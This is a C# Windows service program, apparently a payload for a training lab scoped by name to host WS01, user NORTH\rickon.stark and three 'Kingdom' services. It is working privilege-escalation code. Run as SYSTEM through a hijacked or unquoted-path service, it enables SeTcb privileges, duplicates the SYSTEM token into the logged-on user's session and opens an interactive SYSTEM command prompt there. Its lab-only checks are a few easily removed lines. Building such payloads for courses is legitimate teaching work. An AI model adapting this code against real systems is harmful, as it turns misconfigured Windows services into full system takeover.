// NORTH-only interactive SYSTEM CMD pilot.
// Only WS01, only NORTH\rickon.stark, only the three named course services.
// No listener, credential collection, persistence or file proof output.
using System;
using System.IO;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Threading;

public static class KingdomShell
{
    const uint ALL = 0xF01FF, ENABLED = 2, NEW_CONSOLE = 0x10;
    const string MARK = "NORTH_KINGDOM_SYSTEM_SHELL";
    [StructLayout(LayoutKind.Sequential)] struct Luid { public uint Low; public int High; }
    [StructLayout(LayoutKind.Sequential)] struct Privs { public uint Count; public Luid Luid; public uint Attributes; }
    [StructLayout(LayoutKind.Sequential)] struct Wts { public int Id; public IntPtr Name; public int State; }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct Startup
    {
        public int cb; public string Reserved, Desktop, Title;
        public int X, Y, Width, Height, XChars, YChars, Fill, Flags;
        public short Show, ReservedBytes; public IntPtr Reserved2, Input, Output, Error;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct Child { public IntPtr Process, Thread; public int Pid, Tid; }

    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")] static extern bool ProcessIdToSessionId(uint pid, out uint session);
    [DllImport("advapi32.dll", SetLastError = true)] static extern bool OpenProcessToken(IntPtr process, uint rights, out IntPtr token);
    [DllImport("advapi32.dll", SetLastError = true)] static extern bool DuplicateTokenEx(IntPtr token, uint rights, IntPtr attributes, int level, int type, out IntPtr duplicate);
    [DllImport("advapi32.dll", SetLastError = true)] static extern bool SetTokenInformation(IntPtr token, int info, ref int data, int size);
    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)] static extern bool LookupPrivilegeValue(string host, string name, out Luid luid);
    [DllImport("advapi32.dll", SetLastError = true)] static extern bool AdjustTokenPrivileges(IntPtr token, bool disable, ref Privs privileges, int length, IntPtr previous, IntPtr returned);
    [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUserW", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool CreateProcessAsUser(IntPtr token, string application, StringBuilder cmd,
        IntPtr processAttributes, IntPtr threadAttributes, bool inherit, uint flags, IntPtr env,
        string directory, ref Startup startup, out Child child);
    [DllImport("wtsapi32.dll", EntryPoint = "WTSEnumerateSessionsW", SetLastError = true)]
    static extern bool WTSEnumerateSessions(IntPtr server, int reserved, int version, out IntPtr sessions, out int count);
    [DllImport("wtsapi32.dll", EntryPoint = "WTSQuerySessionInformationW", SetLastError = true)]
    static extern bool WTSQuerySessionInformation(IntPtr server, int session, int field, out IntPtr data, out int count);
    [DllImport("wtsapi32.dll")] static extern void WTSFreeMemory(IntPtr data);

    static string SessionText(int session, int field)
    {
        IntPtr p; int length;
        if (!WTSQuerySessionInformation(IntPtr.Zero, session, field, out p, out length)) return "";
        try { return p == IntPtr.Zero ? "" : Marshal.PtrToStringUni(p); }
        finally { if (p != IntPtr.Zero) WTSFreeMemory(p); }
    }
    static int RickonSession()
    {
        IntPtr p; int count;
        if (!WTSEnumerateSessions(IntPtr.Zero, 0, 1, out p, out count)) return -1;
        try
        {
            int stride = Marshal.SizeOf(typeof(Wts));
            for (int i = 0; i < count; i++)
            {
                Wts s = (Wts)Marshal.PtrToStructure(IntPtr.Add(p, stride * i), typeof(Wts));
                if (s.Id > 0 && s.State == 0 &&
                    String.Equals(SessionText(s.Id, 5), "rickon.stark", StringComparison.OrdinalIgnoreCase) &&
                    String.Equals(SessionText(s.Id, 7), "NORTH", StringComparison.OrdinalIgnoreCase))
                    return s.Id;
            }
        }
        finally { if (p != IntPtr.Zero) WTSFreeMemory(p); }
        return -1;
    }
    static void Privilege(IntPtr token, string name)
    {
        Luid luid;
        if (!LookupPrivilegeValue(null, name, out luid)) throw new InvalidOperationException(name);
        Privs p = new Privs { Count = 1, Luid = luid, Attributes = ENABLED };
        if (!AdjustTokenPrivileges(token, false, ref p, 0, IntPtr.Zero, IntPtr.Zero) ||
            Marshal.GetLastWin32Error() == 1300) throw new InvalidOperationException(name);
    }
    static bool ExistingShell(int session)
    {
        try
        {
            using (ManagementObjectSearcher search = new ManagementObjectSearcher(
                "SELECT ProcessId, CommandLine FROM Win32_Process WHERE Name='cmd.exe'"))
            using (ManagementObjectCollection results = search.Get())
                foreach (ManagementObject item in results)
                    using (item)
                    {
                        string cmd = Convert.ToString(item["CommandLine"]);
                        if (cmd.IndexOf(MARK, StringComparison.OrdinalIgnoreCase) < 0) continue;
                        uint ps;
                        if (ProcessIdToSessionId(Convert.ToUInt32(item["ProcessId"]), out ps) && ps == (uint)session) return true;
                    }
        }
        catch { /* Detection is best-effort if WMI is unavailable. */ }
        return false;
    }
    static bool Spawn(int session)
    {
        IntPtr own = IntPtr.Zero, primary = IntPtr.Zero;
        Child c = new Child();
        try
        {
            if (!OpenProcessToken(GetCurrentProcess(), ALL, out own)) return false;
            Privilege(own, "SeTcbPrivilege");
            Privilege(own, "SeAssignPrimaryTokenPrivilege");
            Privilege(own, "SeIncreaseQuotaPrivilege");
            if (!DuplicateTokenEx(own, ALL, IntPtr.Zero, 2, 1, out primary)) return false;
            if (!SetTokenInformation(primary, 12, ref session, sizeof(int))) return false;
            string dir = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string exe = Path.Combine(dir, "cmd.exe");
            Startup s = new Startup { cb = Marshal.SizeOf(typeof(Startup)), Desktop = @"winsta0\default", Title = MARK };
            StringBuilder command = new StringBuilder("\"" + exe + "\" /K \"title " + MARK + " && whoami\"");
            return CreateProcessAsUser(primary, exe, command, IntPtr.Zero, IntPtr.Zero, false,
                NEW_CONSOLE, IntPtr.Zero, dir, ref s, out c);
        }
        finally
        {
            if (c.Thread != IntPtr.Zero) CloseHandle(c.Thread);
            if (c.Process != IntPtr.Zero) CloseHandle(c.Process);
            if (primary != IntPtr.Zero) CloseHandle(primary);
            if (own != IntPtr.Zero) CloseHandle(own);
        }
    }
    sealed class PilotService : ServiceBase
    {
        int working, success;
        public PilotService(string name)
        {
            ServiceName = name; CanHandleSessionChangeEvent = true; CanStop = true;
        }
        protected override void OnStart(string[] args) { Attempt(); }
        protected override void OnSessionChange(SessionChangeDescription change) { base.OnSessionChange(change); Attempt(); }
        void Attempt()
        {
            if (Interlocked.CompareExchange(ref success, 0, 0) != 0) return;
            ThreadPool.QueueUserWorkItem(delegate
            {
                if (Interlocked.Exchange(ref working, 1) != 0) return;
                try
                {
                    Thread.Sleep(1700);
                    int session = RickonSession();
                    if (session < 0) return;
                    if (!ExistingShell(session) && !Spawn(session)) return;
                    Interlocked.Exchange(ref success, 1);
                    Stop();
                }
                catch { /* Fail closed; never change the lab or spawn elsewhere. */ }
                finally { Interlocked.Exchange(ref working, 0); }
            });
        }
    }
    public static void Main()
    {
        if (!String.Equals(Environment.MachineName, "WS01", StringComparison.OrdinalIgnoreCase) ||
            !WindowsIdentity.GetCurrent().IsSystem) return;
        string name = Path.GetFileNameWithoutExtension(Assembly.GetExecutingAssembly().Location).ToLowerInvariant();
        string service;
        switch (name)
        {
            case "kingdombinary": service = "KingdomBinarySvc"; break;
            case "unquoted": service = "KingdomUpdaterSvc"; break;
            case "kingdomagent": service = "KingdomProgramSvc"; break;
            default: return;
        }
        ServiceBase.Run(new PilotService(service));
    }
}
